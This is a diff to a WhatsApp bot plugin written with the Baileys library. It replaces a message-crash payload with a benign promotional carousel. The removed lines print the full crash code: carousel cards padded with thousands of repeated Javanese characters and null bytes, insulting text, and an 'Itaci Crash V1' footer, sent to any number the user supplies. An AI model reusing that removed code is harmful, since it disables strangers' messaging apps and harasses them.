@@ -1,69 +1,62 @@
 import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
 
-async function carouselNew(conn, isTarget) {
-  for (let i = 0; i < 2; i++) { // Prueba con 2, luego sube
-    let push = [];
+async function carouselVisible(conn, jid) {
+  const cards = [];
 
-    for (let j = 0; j < 10; j++) {
-      push.push({
-        body: { text: "CikssXyz" + "ꦾ".repeat(5000) },
-        footer: { text: "dont panic!!" },
-        header: {
-          title: 'memekk' + "\u0000".repeat(1000),
-          hasMediaAttachment: true,
-          imageMessage: {
-            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
-            mimetype: "image/jpeg",
-            fileLength: "591",
-            height: 0,
-            width: 0,
-            jpegThumbnail: Buffer.from([]),
-          }
+  for (let i = 0; i < 10; i++) {
+    cards.push({
+      body: { text: `🌟 Producto ${i + 1}\nHaz clic para más info.` },
+      footer: { text: "🔥 Oferta por tiempo limitado" },
+      header: {
+        title: `🛒 Promo #${i + 1}`,
+        hasMediaAttachment: true,
+        imageMessage: {
+          url: "https://www.kindacode.com/wp-content/uploads/2021/01/test.jpg",
+          mimetype: "image/jpeg"
+        }
+      },
+      nativeFlowMessage: { buttons: [] }
+    });
+  }
+
+  const msg = generateWAMessageFromContent(jid, {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2
         },
-        nativeFlowMessage: { buttons: [] }
-      });
-    }
-
-    const message = generateWAMessageFromContent(isTarget, {
-      viewOnceMessage: {
-        message: {
-          messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 2
-          },
-          interactiveMessage: {
-            body: { text: "Kontol " + "ꦾ".repeat(10000) },
-            footer: { text: "( 🐉 ) Itaci Crash V1 ( 🐉 )" },
-            header: { hasMediaAttachment: false },
-            carouselMessage: { cards: push }
-          }
+        interactiveMessage: {
+          body: { text: "🧃 Desliza para ver promociones exclusivas" },
+          footer: { text: "CrowBot Carousel" },
+          header: { hasMediaAttachment: false },
+          carouselMessage: { cards }
         }
       }
-    }, {});
+    }
+  }, {});
 
-    await conn.relayMessage(isTarget, message.message, {
-      messageId: message.key.id
-    });
+  await conn.relayMessage(jid, msg.message, {
+    messageId: msg.key.id
+  });
 
-    console.log("✅ Carousel enviado");
-  }
+  console.log("✅ Carrusel visible enviado correctamente");
 }
 
 let handler = async (m, { conn, args, command }) => {
   let target = args[0];
-  if (!target) return m.reply(`⛔ Uso: .${command} número o JID`);
+  if (!target) return m.reply(`📌 Uso: .${command} número o JID`);
 
-  // Si es número simple, normalízalo
   if (!target.includes('@')) {
     target = target.replace(/\D/g, '') + '@s.whatsapp.net';
   }
 
   try {
-    await carouselNew(conn, target);
-    m.reply('✅ Carrusel enviado.');
+    await carouselVisible(conn, target);
+    m.reply('✅ Carrusel visible enviado.');
   } catch (e) {
     console.error("❌ Error:", e);
-    m.reply('❌ Error ejecutando:\n' + (e.message || e));
+    m.reply('❌ Error enviando carrusel:\n' + (e.message || e));
   }
 };
 
